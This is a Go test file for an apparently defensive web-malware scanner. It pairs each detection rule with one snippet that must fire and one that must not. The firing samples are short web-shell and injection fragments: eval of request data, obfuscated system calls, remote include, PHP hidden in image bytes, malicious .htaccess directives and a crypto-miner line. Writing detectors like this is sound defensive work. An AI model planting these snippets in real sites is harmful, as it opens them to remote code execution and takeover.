package rules

import (
	"strings"
	"testing"
)

// sample is one rule probe: a snippet that must fire and one that must not.
type sample struct {
	rule string
	ext  string
	path string
	hit  string
	miss string
}

// Every rule needs both halves. A rule with only a positive case proves
// nothing: a pattern matching everything would pass it.
var samples = []sample{
	{
		rule: "php.eval.encoded", ext: "php", path: "/web/a.php",
		hit:  `<?php eval(base64_decode("ZWNobyAxOw=="));`,
		miss: `<?php $data = base64_decode($row['payload']); echo strlen($data);`,
	},
	{
		rule: "php.eval.request", ext: "php", path: "/web/a.php",
		hit:  `<?php @eval($_POST['cmd']);`,
		miss: `<?php $cmd = $_POST['cmd']; echo htmlspecialchars($cmd);`,
	},
	{
		rule: "php.eval.hexname", ext: "php", path: "/web/a.php",
		hit:  `<?php $f = "\x65\x76\x61\x6c"; $f($x);`,
		miss: `<?php $sep = "\x2c"; echo $sep;`,
	},
	{
		rule: "php.preg_replace.eval", ext: "php", path: "/web/a.php",
		hit:  `<?php preg_replace('/(.*)/e', $_GET['x'], 'y');`,
		miss: `<?php preg_replace('/\s+/', ' ', $text);`,
	},
	{
		rule: "php.callback.request", ext: "php", path: "/web/a.php",
		hit:  `<?php call_user_func($_REQUEST['fn'], 1);`,
		miss: `<?php call_user_func($callback, $item);`,
	},
	{
		rule: "php.dynamic.request_call", ext: "php", path: "/web/a.php",
		hit:  `<?php $_GET['f']($_GET['a']);`,
		miss: `<?php echo $_GET['f'] . ' (' . $count . ')';`,
	},
	{
		rule: "php.eval.variable", ext: "php", path: "/web/a.php",
		hit:  `<?php eval($payload);`,
		miss: `<?php $result = evaluate($payload);`,
	},
	{
		rule: "php.obfuscation.base64_blob", ext: "php", path: "/web/a.php",
		hit:  `<?php $x = "` + strings.Repeat("QUJDZGVm", 40) + `"; echo base64_decode($x);`,
		miss: `<?php $key = "` + strings.Repeat("QUJDZGVm", 40) + `"; echo hash_hmac('sha256', $m, $key);`,
	},
	{
		rule: "php.obfuscation.base64_marker", ext: "php", path: "/web/a.php",
		hit:  `<?php $p = "c3lzdGVtKCRfR0VUWydjJ10pOw=="; echo $p;`,
		miss: `<?php $p = "SGFsbG8gV2VsdA=="; echo $p;`,
	},
	{
		rule: "php.obfuscation.chr_chain", ext: "php", path: "/web/a.php",
		hit:  `<?php $s = chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(120);`,
		miss: `<?php $s = chr(13).chr(10);`,
	},
	{
		rule: "php.obfuscation.hex_call", ext: "php", path: "/web/a.php",
		hit: `<?php "\x73\x79\x73\x74\x65\x6d"($cmd);`,
		// A hex table that is never called is honest code. Crypto libraries
		// in WordPress and Joomla are full of these.
		miss: `<?php $sha = "\x30\x21\x30\x09\x06\x05\x2b\x0e\x03\x02\x1a\x05\x00\x04\x14";`,
	},
	{
		rule: "php.obfuscation.variable_function", ext: "php", path: "/web/a.php",
		hit:  `<?php ${"\x47LOBALS"}['x'] = 'payload';`,
		miss: `<?php $msg = "${name} hat sich angemeldet"; echo $row['id'];`,
	},
	{
		rule: "php.globals.extract_request", ext: "php", path: "/web/a.php",
		hit:  `<?php extract($_REQUEST);`,
		miss: `<?php extract($row, EXTR_SKIP);`,
	},
	{
		rule: "php.exec.request", ext: "php", path: "/web/a.php",
		hit:  `<?php system("ping -c 1 " . $_GET['host']);`,
		miss: `<?php system("/usr/bin/uptime");`,
	},
	{
		rule: "php.backtick.request", ext: "php", path: "/web/a.php",
		hit:  "<?php $out = `ls -la {$_POST['dir']}`;",
		miss: "<?php $out = `/usr/bin/id`;",
	},
	{
		rule: "php.dropper.write_code", ext: "php", path: "/web/a.php",
		hit:  `<?php file_put_contents('x.php', base64_decode($blob));`,
		miss: `<?php file_put_contents($logfile, date('c') . " ok\n", FILE_APPEND);`,
	},
	{
		rule: "php.include.remote", ext: "php", path: "/web/a.php",
		hit:  `<?php include('https://example.invalid/x.txt');`,
		miss: `<?php include(__DIR__ . '/config.php'); $url = 'https://example.invalid/x';`,
	},
	{
		rule: "php.remote.fetch_eval", ext: "php", path: "/web/a.php",
		hit:  `<?php eval(file_get_contents('https://example.invalid/p'));`,
		miss: `<?php $body = file_get_contents('https://example.invalid/p'); echo strlen($body);`,
	},
	{
		rule: "php.webshell.known", ext: "php", path: "/web/a.php",
		hit:  `<?php /* c99shell v.1.0 */ echo 1;`,
		miss: `<?php /* helper for the shell escaping tests */ echo 1;`,
	},
	{
		rule: "php.webshell.password_gate", ext: "php", path: "/web/a.php",
		hit:  `<?php if (md5($_POST['p']) === '5f4dcc3b') { eval($_POST['c']); }`,
		miss: `<?php if (md5($_POST['p']) === $user['hash']) { $ok = true; }`,
	},
	{
		rule: "php.webshell.file_manager", ext: "php", path: "/web/a.php",
		hit:  `<?php $d = scandir('.'); unlink($_GET['file']);`,
		miss: `<?php unlink($cacheFile); $d = scandir($cacheDir);`,
	},
	{
		rule: "php.upload.unchecked", ext: "php", path: "/web/a.php",
		hit:  `<?php move_uploaded_file($_FILES['f']['tmp_name'], './' . $_POST['name']);`,
		miss: `<?php move_uploaded_file($_FILES['f']['tmp_name'], $target . '/' . $safeName);`,
	},
	{
		rule: "php.mailer.request", ext: "php", path: "/web/a.php",
		hit:  `<?php mail($_POST['to'], $subject, $body);`,
		miss: `<?php mail($config['admin'], $subject, $body);`,
	},
	{
		rule: "web.iframe.hidden", ext: "html", path: "/web/a.html",
		hit:  `<iframe src="https://example.invalid/x" width="0" height="0"></iframe>`,
		miss: `<iframe src="https://example.invalid/x" width="640" height="480"></iframe>`,
	},
	{
		rule: "js.eval.encoded", ext: "js", path: "/web/a.js",
		hit:  `eval(atob("YWxlcnQoMSk="));`,
		miss: `var decoded = atob(payload); console.log(decoded);`,
	},
	{
		rule: "js.fromcharcode_chain", ext: "js", path: "/web/a.js",
		hit:  `var s = String.fromCharCode(` + strings.TrimSuffix(strings.Repeat("97,", 40), ",") + `);`,
		miss: `var s = String.fromCharCode(97, 98, 99);`,
	},
	{
		rule: "js.miner", ext: "js", path: "/web/a.js",
		hit:  `var miner = new CoinHive.Anonymous('key');`,
		miss: `var miner = new DataMiner(options);`,
	},
	{
		rule: "js.document_write_encoded", ext: "js", path: "/web/a.js",
		hit:  `document.write(unescape("%3Cscript%3E"));`,
		miss: `document.write("<p>" + text + "</p>");`,
	},
	{
		rule: "php.in_uploads", ext: "php", path: "/wp-content/uploads/2024/x.php",
		hit:  `<?php echo 1;`,
		miss: `# no php open tag at all`,
	},
	{
		rule: "php.in_image", ext: "jpg", path: "/var/www/web/img/logo.jpg",
		hit:  "\xff\xd8\xff\xe0JFIF<?php system($_GET['c']); ?>",
		miss: "\xff\xd8\xff\xe0JFIF plain image bytes",
	},
	{
		rule: "htaccess.php_handler", ext: "", path: "/var/www/web/uploads/.htaccess",
		hit:  "AddType application/x-httpd-php .jpg\n",
		miss: "Options -Indexes\nDenyAll\n",
	},
	{
		rule: "htaccess.auto_prepend", ext: "", path: "/var/www/web/.htaccess",
		hit:  "php_value auto_prepend_file /var/www/web/x.php\n",
		miss: "php_value upload_max_filesize 32M\n",
	},
	{
		rule: "htaccess.redirect_foreign", ext: "", path: "/var/www/web/.htaccess",
		hit:  "RewriteRule ^(.*)$ https://example.invalid/$1 [R=301,L]\n",
		miss: "RewriteRule ^(.*)$ /index.php?q=$1 [L,QSA]\n",
	},
}

func TestSamplesHitTheirRule(t *testing.T) {
	e := NewEngine(nil)
	for _, s := range samples {
		if ByID(s.rule) == nil {
			t.Errorf("rule %s is not in the catalog", s.rule)
			continue
		}
		if !fires(e, s.rule, s.path, s.ext, s.hit) {
			t.Errorf("rule %s did not fire on its positive sample", s.rule)
		}
	}
}

func TestSamplesDoNotHitOnTheNegativeCase(t *testing.T) {
	e := NewEngine(nil)
	for _, s := range samples {
		if fires(e, s.rule, s.path, s.ext, s.miss) {
			t.Errorf("rule %s fired on its negative sample: %s", s.rule, s.miss)
		}
	}
}

// TestEveryRuleHasASample keeps the catalog and the probes in step. A rule
// added without a probe is a rule nobody has ever seen fire.
func TestEveryRuleHasASample(t *testing.T) {
	covered := map[string]bool{}
	for _, s := range samples {
		covered[s.rule] = true
	}
	for _, r := range All() {
		if !covered[r.ID] {
			t.Errorf("rule %s has no sample in engine_test.go", r.ID)
		}
	}
}

func TestIgnoreDisablesARule(t *testing.T) {
	e := NewEngine([]string{"php.eval.request"})
	src := []byte(`<?php eval($_POST['cmd']);`)
	for _, f := range e.Scan("/web/a.php", "/web/a.php", "php", src) {
		if f.Rule == "php.eval.request" {
			t.Fatal("ignored rule still produced a finding")
		}
	}
	if e.RuleCount() != len(All())-1 {
		t.Fatalf("RuleCount = %d, want %d", e.RuleCount(), len(All())-1)
	}
}

func TestOneFindingPerRuleAndFile(t *testing.T) {
	e := NewEngine(nil)
	src := []byte(`<?php eval($_POST['a']); eval($_POST['b']); eval($_POST['c']);`)
	n := 0
	for _, f := range e.Scan("/web/a.php", "/web/a.php", "php", src) {
		if f.Rule == "php.eval.request" {
			n++
		}
	}
	if n != 1 {
		t.Fatalf("got %d findings for one rule, want 1", n)
	}
}

func TestExcerptIsShortAndSingleLine(t *testing.T) {
	e := NewEngine(nil)
	src := []byte("<?php eval(base64_decode(\"" + strings.Repeat("QQ", 400) + "\"));\n")
	found := false
	for _, f := range e.Scan("/web/a.php", "/web/a.php", "php", src) {
		found = true
		if strings.ContainsAny(f.Excerpt, "\n\r") {
			t.Error("excerpt contains a line break")
		}
		if len(f.Excerpt) > maxExcerpt+8 {
			t.Errorf("excerpt is %d bytes, want at most %d", len(f.Excerpt), maxExcerpt+8)
		}
	}
	if !found {
		t.Fatal("no finding produced")
	}
}

func TestLineNumberIsReported(t *testing.T) {
	e := NewEngine(nil)
	src := []byte("<?php\n// harmless\n// still harmless\neval($_POST['x']);\n")
	for _, f := range e.Scan("/web/a.php", "/web/a.php", "php", src) {
		if f.Rule == "php.eval.request" && f.Line != 4 {
			t.Fatalf("line = %d, want 4", f.Line)
		}
	}
}

func fires(e *Engine, rule, path, ext, content string) bool {
	for _, f := range e.Scan(path, path, ext, []byte(content)) {
		if f.Rule == rule {
			return true
		}
	}
	return false
}
